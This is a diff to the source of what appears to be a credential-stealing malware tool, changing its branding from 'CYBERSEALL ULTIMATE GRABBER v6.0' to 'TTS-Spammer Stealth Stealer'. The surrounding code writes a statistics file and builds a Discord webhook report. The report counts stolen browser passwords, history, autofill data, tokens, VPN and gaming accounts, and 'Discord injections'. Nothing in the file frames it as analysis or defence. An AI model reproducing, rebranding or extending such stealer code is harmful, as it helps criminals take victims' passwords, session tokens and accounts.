@@ -1392,7 +1392,7 @@ module.exports = require('./core.asar');
                 
 
                 with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
-                    f.write("CYBERSEALL ULTIMATE GRABBER v6.0\n")
+                    f.write("TTS-Spammer Stealth Grabber\n")
                     f.write("=" * 60 + "\n\n")
                     f.write("FINAL STATISTICS:\n")
                     f.write(f"Browser Passwords: {len(self.p)}\n")
@@ -1457,7 +1457,7 @@ module.exports = require('./core.asar');
 
             embed_fields = [
                 {
-                    "name": "CYBERSEALL ULTIMATE GRABBER v6.0",
+                    "name": "TTS-Spammer Stealth Stealer",
                     "value": f"```Browser Passwords: {total_passwords}\nBrowser History: {total_history}\nAutofill Data: {total_autofill}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}\nDiscord Injections: {total_injections}```",
                     "inline": False
                 },
@@ -1544,11 +1544,11 @@ module.exports = require('./core.asar');
             
             embed = {
                 "embeds": [{
-                    "title": "CYBERSEALL ULTIMATE GRABBER v6.0",
+                    "title": "TTS-Spammer Stealth Stealer v6.0",
                     "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                     "color": 0xff0000,
                     "fields": embed_fields,
-                    "footer": {"text": "Cyberseall ULTIMATE v6.0 - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
+                    "footer": {"text": "TT-Spammer stealth - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
